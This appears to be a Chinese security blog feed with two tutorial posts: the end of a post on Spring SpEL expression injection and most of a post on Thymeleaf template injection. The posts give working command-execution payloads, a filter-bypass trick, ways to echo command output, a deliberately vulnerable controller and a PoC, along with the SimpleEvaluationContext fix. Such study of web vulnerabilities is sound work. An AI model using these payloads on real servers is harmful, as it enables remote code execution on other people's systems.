class="hljs-string">&quot;exec&quot;</span>,T(String)).invoke(T(java.lang.Runtime).getRuntime(),<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br><span class="hljs-comment">//使用ScriptEngineManager构造</span><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -na Calculator&#x27;)&quot;</span>)<br><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runt&quot;</span>%2b<span class="hljs-string">&quot;ime.getRu&quot;</span>%2b<span class="hljs-string">&quot;ntime().e&quot;</span>%2b<span class="hljs-string">&quot;xec(&#x27;open -na Calculator&#x27;)&quot;</span>)<br><br><br><span class="hljs-comment">//引号被过滤，利用生成任意字符+concat函数采取字符串拼接</span><br>T(java.lang.Character).toString(<span class="hljs-number">97</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">98</span>))<br></code></pre></td></tr></table></figure><p><strong>回显问题</strong></p><p>根据前面的demo找了几个能够将命令结果回显出来的payload</p><p>利用StreamUtils</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream()))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214142327992.png" alt="image-20241214142327992"></p><p>还有用BufferedReader封装</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream())).readLine()<br></code></pre></td></tr></table></figure><p>不过只能读取一行</p><p><img src="https://cdn.clown2024.cn/image-20241214142701880.png" alt="image-20241214142701880"></p><p>利用Scanner</p><p>原理在于<code>Scanner#useDelimiter</code>方法使用指定的字符串分割输出，就会让所有的字符都在第一行，然后执行next方法即可获得所有输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;).getInputStream()).useDelimiter(&quot;%5C%5CA&quot;).next()<br></code></pre></td></tr></table></figure><p>通过url传输需要给\url编码一下，因为属于非法字符</p><p><img src="https://cdn.clown2024.cn/image-20241214143839106.png" alt="image-20241214143839106"></p><blockquote><p><code>useDelimiter</code> 方法用于设置 <code>Scanner</code> 的分隔符。<code>&quot;\\A&quot;</code> 是一个正则表达式，表示输入流的开头。使用这个分隔符可以让 <code>Scanner</code> 读取整个输入流，直到结束。</p></blockquote><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了<code>SimpleEvaluationContext</code>作为安全类来防御该类漏洞。</p><p><code>SimpleEvaluationContext</code> 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 <code>SimpleEvaluationContext</code> 替换 <code>StandardEvaluationContext</code>。</p><p>用法示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(message);<br><span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build();<br><span class="hljs-keyword">return</span> expression.getValue(context).toString();<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/01.%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/10.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/01.%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/10.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p><p><a href="https://jishu.dev/2021/05/23/spring-expression-language/">https://jishu.dev/2021/05/23/spring-expression-language/</a></p><p><a href="http://www.bmth666.cn/2023/04/15/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2023/04/15/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html</a></p><p><a href="https://dragonkeeep.top/category/SPEL/index.html">https://dragonkeeep.top/category/SPEL/index.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;赶紧来补一下SPEL表达式注入，前面Thymeleaf本质用的就是SPEL表达式&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Spring表达式语言（简称 &lt;strong</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>thymeleaf模板注入</title>
    <link href="https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2024-12-12T16:09:58.000Z</published>
    <updated>2024-12-13T16:58:34.139Z</updated>
    
    <content type="html"><![CDATA[<p>最近实在是不知道看什么了，来学一下和java相关的一些ssti吧，先从thymeleaf开始</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Thymeleaf就是一个模板渲染引擎，和python的jinjia2一样，就不需要过多介绍了</p><p>官方文档：<a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p><p>高版本SpringBoot&#x2F;Thymeleaf不存在模板注入问题，这里SpringBoot版本为2.5.10(实测得2.4.1，2.5.10已经不行了)，Thymeleaf同上</p><h1 id="demo示例"><a href="#Demo示例" class="headerlink" title="Demo示例"></a>Demo示例</h1><p>首先就是创建一个springboot项目，我们的thymeleaf文件就写在templates目录下</p><p><img src="https://cdn.clown2024.cn/image-20241213110130755.png" alt="image-20241213110130755"></p><p>创建项目的时候可以勾选thymeleaf模板引擎</p><p><img src="https://cdn.clown2024.cn/image-20241213110353299.png" alt="image-20241213110353299"></p><p>一个基础的index.html</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>hello 第一个Thymeleaf程序<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;name&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/demo&quot;)</span><br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(Model model)</span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要用<code>@Controller</code>注解才行，因为该注解主要作用是返回视图名称，这些视图名称会被Spring的视图解析器（View Resolver）解析，从而找到对应的模板文件（如Thymeleaf模板），并将模型数据渲染到模板中，最终生成响应给客户端的视图。</p><p><code>@RestController</code>注解是<code>@Controller</code>和<code>@ResponseBody</code>的组合，它通常用于创建RESTful Web服务。<code>@RestController</code>注解的控制器方法的返回值会自动作为HTTP响应的正文返回，这意味着返回值不会被视图解析器处理，而是直接写入HTTP响应体中。</p><h1 id="一些语法"><a href="#一些语法" class="headerlink" title="一些语法"></a>一些语法</h1><p>thymeleaf的html文件首先要包含这个</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><p><strong>标签</strong></p><table><thead><tr><th>标签</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td>th:id</td><td>替换id</td><td><code>&lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td></tr><tr><td>th:text</td><td>文本替换</td><td><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td></tr><tr><td>th:utext</td><td>支持html的文本替换</td><td><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td></tr><tr><td>th:object</td><td>替换对象</td><td><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td></tr><tr><td>th:value</td><td>替换值</td><td><code>&lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td></tr><tr><td>th:each</td><td>迭代</td><td><code>&lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td></tr><tr><td>th:href</td><td>替换超链接</td><td><code>&lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;超链接&lt;/a&gt;</code></td></tr><tr><td>th:src</td><td>替换资源</td><td><code>&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td></tr></tbody></table><p><strong>链接表达式</strong></p><p>使用<code>@&#123;资源地址&#125;</code>引入资源，引入的地址可以在static目录，也可以是互联网的资源，格式如上面的标签示例</p><p><strong>变量表达式</strong></p><p>这部分也是页面能动态渲染的核心，可以用<code>$&#123;...&#125;</code>的形式在model中取值，前面的demo中也可以看到我们往model中添加了属性的键值对</p><p>取JavaBean对象使用<code>$&#123;对象名.对象属性&#125;</code>或者<code>$&#123;对象名[&#39;对象属性&#39;]&#125;</code>来取值。如果JavaBean写了get方法也可以通过<code>$&#123;对象.get方法名&#125;</code>取值。</p><p>取Map对象使用<code>$&#123;Map名[&#39;key&#39;]&#125;</code>或<code>$&#123;Map名.key&#125;</code></p><p>取List集合：List集合是一个有序列表，需要使用each遍历赋值，<code>&lt;tr th:each=&quot;item:$&#123;userlist&#125;&quot;&gt;</code></p><p><strong>选择变量表达式</strong></p><p>该表达式的写法为*{…}，写个例子就明白了</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;name&#125;&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;age&#125;&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;detail&#125;&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">user</span><span class="hljs-params">(Model model)</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;clown&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213143906940.png" alt="image-20241213143906940"></p><p><strong>消息表达式</strong></p><p>文本外部化是从模板文件中提取模板代码的片段，以便可以将它们保存在单独的文件(通常是.properties文件)中,文本的外部化片段通常称为“消息”。通俗易懂的来说<code>#&#123;…&#125;</code>语法就是用来读取配置文件中数据的。</p><p>这里也写个例子更好体会，首先在templates目录下建立<code>clown.properties</code>中写入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">demo.nane=clown<br>demo.age=22<br>province=UnKnown<br></code></pre></td></tr></table></figure><p>然后在application.properties加入下面内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">spring.messages.basename=templates/demo<br></code></pre></td></tr></table></figure><p>html内容如下</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.age&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.nane&#125;&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Province: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;province&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.clown2024.cn/image-20241213145707765.png" alt="image-20241213145707765"></p><p><strong>片段表达式</strong></p><p>片段表达式<code>~&#123;...&#125;</code>可以用于引用公共的目标片段，比如可以在一个<code>template/public.html</code>中定义下面的片段,并在另一个template中引用。</p><p>公共片段：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;copy&quot;</span>&gt;</span><br>    © 2011 The Good Thymes Virtual Grocery<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>引用公共片段：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;public :: copy&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213175923703.png" alt="image-20241213175923703"></p><h1 id="springmvc视图解析过程"><a href="#SpringMVC视图解析过程" class="headerlink" title="SpringMVC视图解析过程"></a>SpringMVC视图解析过程</h1><p>视图解析的过程是发生在Controller处理后，Controller处理结束后会将返回的结果封装为<code>ModelAndView</code>对象，再通过视图解析器<code>ViewResovler</code>得到对应的视图并返回。</p><p>给一张SpringMVC的执行流程图</p><p><img src="http://cdn.clown2024.cn/202407270110622.png" alt="image-20240727011007456"></p><p>我们可以用前面的demo跟进调试一下，看一下视图是如何解析的</p><h2 id="封装modelandview对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h2><p>先走到<code>ServletInvocableHandlerMethod#invokeAndHandle</code>中，其源码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>setResponseStatus(webRequest);<br><br><span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (isRequestNotModified(webRequest) || getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>disableContentCachingIfNecessary(webRequest);<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(getResponseStatusReason())) &#123;<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(formatErrorForReturnValue(returnValue), ex);<br>&#125;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相关的变量值</p><p><img src="https://cdn.clown2024.cn/image-20241213214443799.png" alt="image-20241213214443799"></p><p>该函数内部进行了如下操作：</p><ul><li><code>invokeForRequest</code>调用Controller后获取返回值到<code>returnValue</code>中</li><li>判断<code>returnValue</code>是否为空，如果是则继续判断<code>RequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></li><li>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中。</li></ul><p>这里往下走returnValue返回的是index</p><p><img src="https://cdn.clown2024.cn/image-20241213214722184.png" alt="image-20241213214722184"></p><p>然后再看handleReturnValue方法，这个方法应该就是对模板进行解析，继续跟进去看看</p><p><img src="https://cdn.clown2024.cn/image-20241213221758950.png" alt="image-20241213221758950"></p><p>获取一个ViewNameMethodReturnValueHandler然后继续处理，继续跟进</p><p><img src="https://cdn.clown2024.cn/image-20241213222152893.png" alt="image-20241213222152893"></p><ul><li>判断returnValue类型是否为字符型，设置<code>mavContainer.viewName</code></li><li>判断returnValue是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li></ul><p>然后返回到RequestMappingHandlerAdapter#invokeHandlerMethod方法里面</p><p><img src="https://cdn.clown2024.cn/image-20241213222951397.png" alt="image-20241213222951397"></p><p>通过getModelAndView方法返回ModelAndView</p><h2 id="获取modelandview视图"><a href="#获取ModelAndView视图" class="headerlink" title="获取ModelAndView视图"></a>获取ModelAndView视图</h2><p>获取<code>ModelAndView</code>后，通过<code>DispatcherServlet#render</code>获取视图解析器并渲染，中间的过程就不再分析了，就是枯燥的跟着走而已</p><p>不过到这里流程也很符合前面流程图所总结的那样</p><p><img src="https://cdn.clown2024.cn/image-20241213223643677.png" alt="image-20241213223643677"></p><p>resolveViewName是遍历视图解析器然后返回一个，其中里面有五个视图解析器</p><p><img src="https://cdn.clown2024.cn/image-20241213224250552.png" alt="image-20241213224250552"></p><p>这里返回的View是ThymeleafView</p><p><img src="https://cdn.clown2024.cn/image-20241213224019290.png" alt="image-20241213224019290"></p><h2 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h2><p>最后就是调用ThymeleafView的render函数进行视图渲染</p><p><img src="https://cdn.clown2024.cn/image-20241213224451300.png" alt="image-20241213224451300"></p><p>后面的具体渲染分析漏洞的时候再调试</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="templatename漏洞"><a href="#templatename漏洞" class="headerlink" title="templatename漏洞"></a>templatename漏洞</h2><p>给出一个漏洞代码的demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这种情况是直接将参数拼接到了模板路径中</p><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><blockquote><p>这里即使不加<code>.x</code>依然可以触发命令执行</p></blockquote><p>一开始我用的thymeleaf2.5.10版本打这个payload给我报了下面的错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">View name contains an expression and so does either the URL path or one of the request 